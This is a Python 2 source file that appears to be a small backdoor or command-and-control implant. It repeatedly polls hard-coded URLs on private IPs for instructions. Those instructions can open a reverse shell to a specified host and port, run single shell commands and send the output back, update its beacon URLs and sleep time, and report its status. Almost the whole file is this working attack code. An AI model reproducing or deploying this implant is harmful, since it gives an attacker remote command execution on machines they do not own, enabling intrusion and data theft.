import re,urllib,urllib2,socket,time,subprocess,random,threading

def connect_start(ip,port,mysocket):
    connected=False
    trycount=0
    while not connected:
        try:
           mysocket.connect((ip,int(port)))
        except socket.error:
            trycount+=1
            if trycount==3:
                break
            time.sleep(1)
            continue
        else:
            connected=True
            break


def Connect(ip,port,mysocket): #actual connection piece
    print "it started"
    connected=False
    trycount=0
    if port==9000:
        connected=True
        print "Stop command received, sleeping"
    while not connected:
            try:
                print "Trying",port,
                mysocket.connect((ip,int(port)))
            except socket.error:
                print "Nope"
                trycount+=1
                if trycount==5:
                    break
                time.sleep(1)
                continue
            else:
                print "Connected"
                connected=True
                break
            

def Shell(ip,port,mysocket):
    connect_start(ip,port,mysocket)
    while True: 
        try:
            commandrequested=mysocket.recv(1024)
            if len(commandrequested)==0:
                time.sleep(2)
                mysocket=socket.socket()
                Shell(ip,port,mysocket)
                continue
            if commandrequested[:4]=="QUIT":
                 mysocket.send("Terminating Connection.")
                 mysocket.close()
                 break
                
            prochandle = subprocess.Popen(commandrequested,  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            (output, error) = prochandle.communicate()
            results=''
            if error is not None:
                results=error.decode()
            results = results+output.decode()
            mysocket.send(results)
        except socket.error:
            break
        except Exception as e:
            mysocket.send(str(e))
            break

def Single_Command(ip,port,mysocket,command):
    connect_start(ip,port,mysocket)
    while True: 
        try:
            commandrequested=command
            prochandle = subprocess.Popen(commandrequested,  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            (output, error) = prochandle.communicate()
            results=''
            if error is not None:
                results=error.decode()
            results = results+output.decode()
            mysocket.send(results)
            
            break
        except socket.error:
            break
        except Exception as e:
            mysocket.send(str(e))
            break

def Send_Text(ip,port,mysocket,status):
    connect_start(ip,port,mysocket)     

    try:
            mysocket.send(status)
            mysocket.close()
            
    except socket.error:
            mysocket.close()

            
def main():
 #if using a proxy use these next 3 lines
 #proxy=urllib2.ProxyHandler({'http': '10.50.50.210:3128'})
 #opener = urllib2.build_opener(proxy)
 #urllib2.install_opener(opener)
    shells=[]
    sleeptime=2
    url_to_try=['http://10.0.0.21:8080/nothere.html','http://10.0.0.21:8080/index.html','http://10.10.10.21:8080/notafile.html']
    status=""
    while True:
        mysocket=socket.socket()
        shellsocket=socket.socket()
        request=''
        commandsin=[]
        while (request==''):
            for url in url_to_try:
                try:
                    request = urllib2.urlopen(url)
                except:
                    request=''
                if request!='':
                    break
        status="Current Sleep Time: "+str(sleeptime)+"\nCurrent url configs: \n"
        for url in url_to_try:
            status=status+url+"\n"
        for line in request:
            line=line.replace('\n','')
            line=line.split('=')
            
            if line[0]=='update_urls':
                url_to_try=line[1].split(',')
            if line[0]=='sleeptime':
                sleeptime=line[1]
            if line[0]=="shell":
                tmp=line[1].split(',')
                new_shell = threading.Thread(target=Shell, args=(tmp[0],tmp[1],shellsocket))
                new_shell.start()
            if line[0]=='status':
                tmp=line[1].split(',')
                Send_Text(tmp[0],tmp[1],mysocket,status)
                   
            if line[0]=="single_command":
                tmp=line[1].split(',')
                Single_Command(tmp[0],tmp[1],mysocket,tmp[2])

        time.sleep(float(sleeptime))
  
if __name__ == "__main__":
    main()
